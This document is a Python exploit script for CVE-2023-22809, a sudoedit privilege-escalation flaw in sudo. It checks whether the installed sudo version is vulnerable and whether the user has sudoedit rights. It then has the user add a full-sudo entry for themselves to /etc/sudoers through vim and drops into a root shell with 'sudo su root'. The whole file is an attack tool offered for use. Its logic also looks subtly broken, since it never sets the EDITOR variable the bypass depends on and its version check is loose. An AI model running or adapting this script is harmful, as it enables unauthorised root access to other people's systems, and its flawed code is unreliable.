# CVE: CVE-2023-22809
# Date: 2023/01/21
# Vendor Homepage: https://www.sudo.ws/
# Software Link: https://www.sudo.ws/dist/sudo-1.9.12p1.tar.gz
# Version: 1.8.0 to 1.9.12p1
# Exploit Creator: Toothless5143

import os

# Define colors for printing
Gcyan = '\033[1;36m'
Cyan = '\033[0;36m'
STOP = '\033[0m'

# Logo text
logo = '''


  ___  _  _  ____     ___   ___  ___   ___      ___   ___   ___   ___   ___ 
 / __)( \/ )( ___)___(__ \ / _ \(__ \ (__ ) ___(__ \ (__ \ ( _ ) / _ \ / _ \
( (__  \  /  )__)(___)/ _/( (_) )/ _/  (_ \(___)/ _/  / _/ / _ \( (_) )\_  /
 \___)  \/  (____)   (____)\___/(____)(___/    (____)(____)\___/ \___/  (_/ 

                                                                         
'''
print(Gcyan + logo + STOP)
print(Cyan + "CVE-2023-22809" + STOP + Gcyan + "   By: Toothless5143\n" + STOP)

# Check sudo version
sudo_version_line = os.popen('sudo --version | head -1').read()
if not any(version in sudo_version_line for version in ['1.8', '1.9.0', '1.9.1', '1.9.2', '1.9.3', '1.9.12p1']):
    print("> Currently installed sudo version is not vulnerable")
    exit(1)

# Check user's sudo privileges
sudo_list = os.popen('sudo -l').readlines()
exploitable_lines = [
    line for line in sudo_list
    if any(keyword in line for keyword in ['sudoedit', 'sudo -e']) and ('(root)' in line or '(ALL)' in line or '(ALL : ALL)' in line)
]

if not exploitable_lines:
    print("> It doesn't seem that this user can run sudoedit as root")
    confirm = input("Do you want to proceed anyway? (y/N): ")
    if confirm.lower() not in ['y', 'yes']:
        exit(2)
else:
    print("> BINGO! User exploitable")

print("> Opening sudoers file, please add the following line to the file in order to do the privesc:")
current_user = os.popen('whoami').read().strip()
print(f"{current_user} ALL=(ALL:ALL) ALL")

input("Press Enter to continue...")
editor_command = os.system('sudo -n vim -- /etc/sudoers')
if editor_command != 0:
    print("Error opening the sudoers file with vim")
    print(editor_command)
    exit(3)

os.system('sudo -n su root')
exit(0)